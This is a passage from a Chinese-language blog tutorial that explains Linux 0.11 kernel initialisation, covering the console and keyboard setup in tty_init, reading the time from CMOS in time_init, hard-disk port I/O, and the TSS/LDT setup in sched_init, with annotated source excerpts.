class="number">0x3d4</span>;</span><br><span class="line">    video_port_val  = <span class="number">0x3d5</span>;</span><br><span class="line">    video_mem_end = <span class="number">0xba000</span>;</span><br><span class="line">    <span class="comment">// 第三部分 滚动屏幕操作时的信息</span></span><br><span class="line">    origin  = video_mem_start;</span><br><span class="line">    scr_end = video_mem_start + video_num_lines * video_size_row;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">    bottom  = video_num_lines;</span><br><span class="line">    <span class="comment">// 第四部分 定位光标并开启键盘中断</span></span><br><span class="line">    gotoxy(ORIG_X, ORIG_Y);</span><br><span class="line">    set_trap_gate(<span class="number">0x21</span>,&amp;keyboard_interrupt);<span class="comment">//设置键盘中断号</span></span><br><span class="line">    outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfd</span>,<span class="number">0x21</span>);</span><br><span class="line">    a=inb_p(<span class="number">0x61</span>);</span><br><span class="line">    outb_p(a|<span class="number">0x80</span>,<span class="number">0x61</span>);</span><br><span class="line">    outb(a,<span class="number">0x61</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前操作系统用汇编在内存中存了很多数据：</p><table><thead><tr><th>内存地址</th><th>长度(字节)</th><th>名称</th></tr></thead><tbody><tr><td>0x90000</td><td>2</td><td>光标位置</td></tr><tr><td>0x90002</td><td>2</td><td>扩展内存数</td></tr><tr><td>0x90004</td><td>2</td><td>显示页面</td></tr><tr><td>0x90006</td><td>1</td><td>显示模式</td></tr><tr><td>0x90007</td><td>1</td><td>字符列数</td></tr><tr><td>0x90008</td><td>2</td><td>未知</td></tr><tr><td>0x9000A</td><td>1</td><td>显示内存</td></tr><tr><td>0x9000B</td><td>1</td><td>显示状态</td></tr><tr><td>0x9000C</td><td>2</td><td>显卡特性参数</td></tr><tr><td>0x9000E</td><td>1</td><td>屏幕行数</td></tr><tr><td>0x9000F</td><td>1</td><td>屏幕列数</td></tr><tr><td>0x90080</td><td>16</td><td>硬盘1参数表</td></tr><tr><td>0x90090</td><td>16</td><td>硬盘2参数表</td></tr><tr><td>0x901FC</td><td>2</td><td>根设备号</td></tr></tbody></table><p>第一部分：获取 <code>0x90006</code>处的数据，对应着表就是获取显示模式。</p><p>第二部分：显存映射的内存地址范围。</p><p>第三部分：设置一些滚动屏幕时需要的参数，定义顶行(第一行)和底行(最后一行)是哪里</p><p>第四部分：把光标定位到之前保存的光标位置处(内存 <code>0x90000</code> 处数据)，设置并开启中断。</p><p>开启键盘中断后，每敲击一个按键就会触发一次中断，中断程序就会把键盘码转换成 ASCII 码，然后写到光标处的内存地址，也就相当于往显存写，于是这个键盘敲击的字符就显示在了屏幕上。</p><p>这一切具体是怎么做到的呢？</p><p>从整段代码调用第一个函数开始看起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gotoxy(ORIG_X, ORIG_Y);</span><br></pre></td></tr></table></figure><p>跟进</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">gotoxy</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> new_x,<span class="keyword">unsigned</span> <span class="keyword">int</span> new_y)</span> </span>&#123;</span><br><span class="line">   ...</span><br><span class="line">   x = new_x;</span><br><span class="line">   y = new_y;</span><br><span class="line">   pos = origin + y*video_size_row + (x&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>x</code>表示列数；<code>y</code>表示行数；<code>pos</code>表示根据行号和列号计算出来的内存指针，也就是往<code>坐标(x,y)</code>所在的地址里写数据。</p><p>当按下键盘，触发键盘中断，程序调用链如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_keyboard_interrupt:</span><br><span class="line">    ...</span><br><span class="line">    call _do_tty_interrupt</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_tty_interrupt</span><span class="params">(<span class="keyword">int</span> tty)</span> </span>&#123;</span><br><span class="line">   copy_to_cooked(tty_table+tty);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_to_cooked</span><span class="params">(struct tty_struct * tty)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    tty-&gt;write(tty);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制台时 tty 的 write 为 con_write 函数(/kernel/chr_drv/console.c)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct * tty)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    __asm__(<span class="string">&quot;movb _attr,%%ah\n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;movw %%ax,%1\n\t&quot;</span></span><br><span class="line">      ::<span class="string">&quot;a&quot;</span> (c),<span class="string">&quot;m&quot;</span> (*(<span class="keyword">short</span> *)pos)</span><br><span class="line">      :<span class="string">&quot;ax&quot;</span>);</span><br><span class="line">     pos += <span class="number">2</span>;</span><br><span class="line">     x++;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接看 con_write </p><p>内联汇编处，把键盘输入的字符<code>c</code>写入<code>poc</code>指针指向的内存，相当于在屏幕上输出。</p><p>之后的<code>pos += 2</code>和<code>x++</code>，相当于改变<code>pos</code>的值，也就是改变光标。</p><p>所以说白了，内存把屏幕上所有的坐标点所对应的地址都映射到了内存中，当写入字符时，就是给光标所对应的坐标点的地址赋值，然后再移动光标。</p><p><strong>换行</strong>：处于当前行的最后一列，就将光标计算出一个新值，使其处于下一行的开头，程序调用链如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct * tty)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (x&gt;=video_num_columns) &#123;<span class="comment">//判断x是否大于总列数</span></span><br><span class="line">        x -= video_num_columns;<span class="comment">//大于了就减去总列数，即变为0</span></span><br><span class="line">        pos -= video_size_row;</span><br><span class="line">        lf();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lf</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (y+<span class="number">1</span>&lt;bottom) &#123;<span class="comment">//判断y+1是否小于总行数</span></span><br><span class="line">      y++;<span class="comment">//小于就y+1</span></span><br><span class="line">      pos += video_size_row;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>/kernel/chr_drv/console.c</code>文件中还可以找到各种各样操作的源码，例如滚屏、回车、删除、插入等，简单列出一些：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位光标的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">gotoxy</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> new_x, <span class="keyword">unsigned</span> <span class="keyword">int</span> new_y)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">// 滚屏，即内容向上滚动一行</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scrup</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">// 光标同列位置下移一行</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lf</span><span class="params">(<span class="keyword">int</span> currcons)</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">// 光标回到第一列</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cr</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 删除一行</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_line</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>总结一下 tty_init() 干的事：完善了键盘的输入和显示器的输出功能</strong></p><h3 id="time-init"><a href="#time-init" class="headerlink" title="time_init()"></a>time_init()</h3><p>操作系统是怎么获取当前时间的呢？联网时，可以通过网络同步；但是不联网时，为什么时间是准确的呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMOS_READ(addr) (&#123; \</span></span><br><span class="line">    outb_p(<span class="number">0x80</span>|addr,<span class="number">0x70</span>); \</span><br><span class="line">    inb_p(<span class="number">0x71</span>); \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BCD_TO_BIN(val) ((val)=((val)&amp;15) + ((val)&gt;&gt;4)*10)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">time_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        time.tm_sec = CMOS_READ(<span class="number">0</span>);</span><br><span class="line">        time.tm_min = CMOS_READ(<span class="number">2</span>);</span><br><span class="line">        time.tm_hour = CMOS_READ(<span class="number">4</span>);</span><br><span class="line">        time.tm_mday = CMOS_READ(<span class="number">7</span>);</span><br><span class="line">        time.tm_mon = CMOS_READ(<span class="number">8</span>);</span><br><span class="line">        time.tm_year = CMOS_READ(<span class="number">9</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (time.tm_sec != CMOS_READ(<span class="number">0</span>));</span><br><span class="line">    BCD_TO_BIN(time.tm_sec);</span><br><span class="line">    BCD_TO_BIN(time.tm_min);</span><br><span class="line">    BCD_TO_BIN(time.tm_hour);</span><br><span class="line">    BCD_TO_BIN(time.tm_mday);</span><br><span class="line">    BCD_TO_BIN(time.tm_mon);</span><br><span class="line">    BCD_TO_BIN(time.tm_year);</span><br><span class="line">    time.tm_mon--;<span class="comment">//tm_mon 月份范围是0-11</span></span><br><span class="line">    startup_time = kernel_mktime(&amp;time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主要是由<code>CMOS_READ</code>和<code>BCD_TO_BIN</code>这两个函数实现的。</p><p><strong>CMOS_READ</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMOS_READ(addr) (&#123; \</span></span><br><span class="line">    outb_p(<span class="number">0x80</span>|addr,<span class="number">0x70</span>); \</span><br><span class="line">    inb_p(<span class="number">0x71</span>); \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个<code>outb_p</code>和<code>inb_p</code>是什么意思呢？</p><p>out 相当于写了一下，in 相当于读了一下，这是 CPU 与外设交互的一种方式，CPU 与外设打交道基本是通过端口，在特定端口上写上特定的值来命令外设干嘛，然后从另一个端口读值来接受外设的反馈。</p><p>整段代码代表对 CMOS 读取了一些数据，CMOS 是主板上一个可读写的存储设备，它会在计算机关机时存储一些信息，这里只要知道它是一种外设就行了。</p><hr><p>这里以硬盘为例讲一下交互</p><p>先看一下硬盘的端口表</p><table><thead><tr><th>端口</th><th>读</th><th>写</th></tr></thead><tbody><tr><td>0x1F0</td><td>数据寄存器</td><td>数据寄存器</td></tr><tr><td>0x1F1</td><td>错误寄存器</td><td>特征寄存器</td></tr><tr><td>0x1F2</td><td>扇区计数寄存器</td><td>扇区计数寄存器</td></tr><tr><td>0x1F3</td><td>扇区号寄存器或 LBA 块地址 0~7</td><td>扇区号或 LBA 块地址 0~7</td></tr><tr><td>0x1F4</td><td>磁道数低 8 位或 LBA 块地址 8~15</td><td>磁道数低 8 位或 LBA 块地址 8~15</td></tr><tr><td>0x1F5</td><td>磁道数高 8 位或 LBA 块地址 16~23</td><td>磁道数高 8 位或 LBA 块地址 16~23</td></tr><tr><td>0x1F6</td><td>驱动器/磁头或 LBA 块地址 24~27</td><td>驱动器/磁头或 LBA 块地址 24~27</td></tr><tr><td>0x1F7</td><td>命令寄存器或状态寄存器</td><td>命令寄存器</td></tr></tbody></table><p>读硬盘时，会先往除<code>0x1F0</code>端口的其他端口上写数据，告诉硬盘要读的是哪个扇区，读多少。然后再从<code>0x1F0</code>这个端口读数据。</p><p>具体过程：</p><ol><li>在 0x1F2 写入要读取的扇区数</li><li>在 0x1F3 ~ 0x1F6 这四个端口写入计算好的起始 LBA 地址</li><li>在 0x1F7 处写入读命令的指令号</li><li>不断检测 0x1F7 （此时已成为状态寄存器的含义）的忙位</li><li>如果第四步骤为不忙，则开始不断从 0x1F0 处读取数据到内存指定位置，直到读完</li></ol><hr><p>所以我们再回到代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMOS_READ(addr) (&#123; \</span></span><br><span class="line">    outb_p(<span class="number">0x80</span>|addr,<span class="number">0x70</span>); \</span><br><span class="line">    inb_p(<span class="number">0x71</span>); \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BCD_TO_BIN(val) ((val)=((val)&amp;15) + ((val)&gt;&gt;4)*10)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">time_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">time</span>;</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        time.tm_sec = CMOS_READ(<span class="number">0</span>);</span><br><span class="line">        time.tm_min = CMOS_READ(<span class="number">2</span>);</span><br><span class="line">        time.tm_hour = CMOS_READ(<span class="number">4</span>);</span><br><span class="line">        time.tm_mday = CMOS_READ(<span class="number">7</span>);</span><br><span class="line">        time.tm_mon = CMOS_READ(<span class="number">8</span>);</span><br><span class="line">        time.tm_year = CMOS_READ(<span class="number">9</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (time.tm_sec != CMOS_READ(<span class="number">0</span>));</span><br><span class="line">    BCD_TO_BIN(time.tm_sec);</span><br><span class="line">    BCD_TO_BIN(time.tm_min);</span><br><span class="line">    BCD_TO_BIN(time.tm_hour);</span><br><span class="line">    BCD_TO_BIN(time.tm_mday);</span><br><span class="line">    BCD_TO_BIN(time.tm_mon);</span><br><span class="line">    BCD_TO_BIN(time.tm_year);</span><br><span class="line">    time.tm_mon--;<span class="comment">//tm_mon 月份范围是0-11</span></span><br><span class="line">    startup_time = kernel_mktime(&amp;time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_while 循环，通过读写 CMOS 上的指定端口，获取<strong>年月日时分秒</strong>。至于 CMOS 是如何知道时间的，这个就不在我们讨论范围内了。</p><p><strong>BCD_TO_BIN</strong></p><p>将 BCD 转换成 BIN，因为从 CMOS 中获取的都是 BCD 码值，所以要转换成存储在我们变量上的二进制数值。</p><p><strong>kernel_mktime</strong> </p><p>将之前收集到的时间数据，计算从 <strong>1970 年 1 月 1 日 0 时 **起到开机当时经过的秒数，作为开机时间，存储在 **startup_time</strong> 这个变量里。</p><p><strong>总结一下 time_init() 干的事：对 CMOS 进行读写操作，获取时间数据，经过一系列转换后得到开机时间。</strong></p><h3 id="shed-init"><a href="#shed-init" class="headerlink" title="shed_init()"></a><strong>shed_init()</strong></h3><p>进程调度初始化，多进程的基石！！！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    set_tss_desc(gdt+<span class="number">4</span>, &amp;(init_task.task.tss));</span><br><span class="line">    set_ldt_desc(gdt+<span class="number">5</span>, &amp;(init_task.task.ldt));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化 <code>TSS</code> 和 <code>LDT</code>，先说一下这两句话干了啥，之前有说过全局描述符表 gdt，gdt 表中不同位置存储了不同的段，这两句话就是把<code>TSS</code>和<code>LDT</code>存入<code>gdt</code>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648439425080654/98c499f6dd0d45d64b76ae3b9b12bd5b42d9f581.png" alt="640"></p><p>现在再来说说这两个结构事干嘛的：</p><p><strong>TSS</strong></p><p><code>TSS</code>是<strong>任务状态段</strong>，会<strong>保存和恢复进程的上下文</strong>，上下文就是各个寄存器的信息。这样进程切换的时候，即从A进程切换到B进程时，会先保存A进程寄存器的信息，当再次切换回A进程时，就会恢复寄存器里的信息，以便继续执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> back_link;</span><br><span class="line">    <span class="keyword">long</span> esp0;</span><br><span class="line">    <span class="keyword">long</span> ss0;</span><br><span class="line">    <span class="keyword">long</span> esp1;</span><br><span class="line">    <span class="keyword">long</span> ss1;</span><br><span class="line">    <span class="keyword">long</span> esp2;</span><br><span class="line">    <span class="keyword">long</span> ss2;</span><br><span class="line">    <span class="keyword">long</span> cr3;</span><br><span class="line">    <span class="keyword">long</span> eip;</span><br><span class="line">    <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">long</span> eax, ecx, edx, ebx;</span><br><span class="line">    <span class="keyword">long</span> esp;</span><br><span class="line">    <span class="keyword">long</span> ebp;</span><br><span class="line">    <span class="keyword">long</span> esi;</span><br><span class="line">    <span class="keyword">long</span> edi;</span><br><span class="line">    <span class="keyword">long</span> es;</span><br><span class="line">    <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">long</span> ss;</span><br><span class="line">    <span class="keyword">long</span> ds;</span><br><span class="line">    <span class="keyword">long</span> fs;</span><br><span class="line">    <span class="keyword">long</span> gs;</span><br><span class="line">    <span class="keyword">long</span> ldt;</span><br><span class="line">    <span class="keyword">long</span> trace_bitmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">i387_struct</span> <span class="title">i387</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>LDT</strong></p><p><code>LDT</code>是<strong>局部描述符表</strong>，与 GDT 全局描述符表相对应。内核态代码用 GDT 里的数据段和代码段，而用户进程代码则用每个用户进程自己的 LDT 里的数据段和代码段。</p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> a,b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span>[64] =</span> &#123;&amp;(init_task.task), &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> * <span class="title">p</span>;</span></span><br><span class="line">        p = gdt+<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">64</span>;i++) &#123;</span><br><span class="line">        task[i] = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">        p++;</span><br><span class="line">        p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环给长度为64，结构为 task_struct 的数组 task 赋值 NULL (1~63)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648448883390142/33cef6c48ae10c3e9e402b9cb81584b292f54551.png" alt="640 (2)"></p><p>task_struct 结构代表每个进程的信息，很重要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* these are hardcoded - don&#x27;t touch */</span></span><br><span class="line">    <span class="keyword">long</span> state; <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">    <span class="keyword">long</span> counter;</span><br><span class="line">    <span class="keyword">long</span> priority;</span><br><span class="line">    <span class="keyword">long</span> signal;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigaction</span>[32];</span></span><br><span class="line">    <span class="keyword">long</span> blocked; <span class="comment">/* bitmap of masked signals */</span></span><br><span class="line">  <span class="comment">/* various fields */</span></span><br><span class="line">    <span class="keyword">int</span> exit_code;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_code,end_code,end_data,brk,start_stack;</span><br><span class="line">    <span class="keyword">long</span> pid,father,pgrp,session,leader;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> uid,euid,suid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> gid,egid,sgid;</span><br><span class="line">    <span class="keyword">long</span> alarm;</span><br><span class="line">    <span class="keyword">long</span> utime,stime,cutime,cstime,start_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> used_math;</span><br><span class="line">  <span class="comment">/* file system info */</span></span><br><span class="line">    <span class="keyword">int</span> tty;  <span class="comment">/* -1 if no tty, so it must be signed */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> umask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">pwd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">root</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">executable</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> close_on_exec;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>[<span class="title">NR_OPEN</span>];</span></span><br><span class="line">  <span class="comment">/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>[3];</span></span><br><span class="line">  <span class="comment">/* tss for this task */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>循环后面的内容就是给 gdt 剩下的位置都填充为 0，也就是把剩下留给 TSS 和 LDT 的描述符都先附上空值。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648449524576329/33cef6c48ae10c3e9e402b9cb81584b292f54551.png" alt="640 (2)"></p><p>以后每创建一个新进程，就会在后面添加一组 TSS 和 LDT 表示这个进程的任务状态段以及局部描述符表信息。</p><p>简单看一下，不懂也没事：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648449619025578/aaee914fbed9419244dbf27cbfb745974106df16.png" alt="640 (1)"></p><p>为啥还没创建进程就会有一组 TSS 和 LDT 呢？是因为当进程调度机制建立起来，正在执行的代码就会变成 进程0 的代码，也就是说正在运行的代码会作为未来的一个进程的指令流。(不懂也没事)</p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ltr(n) __asm__(<span class="meta-string">&quot;ltr %%ax&quot;</span>::<span class="meta-string">&quot;a&quot;</span> (_TSS(n)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lldt(n) __asm__(<span class="meta-string">&quot;lldt %%ax&quot;</span>::<span class="meta-string">&quot;a&quot;</span> (_LDT(n)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    ltr(<span class="number">0</span>);</span><br><span class="line">    lldt(<span class="number">0</span>);</span><br><span class="line"> 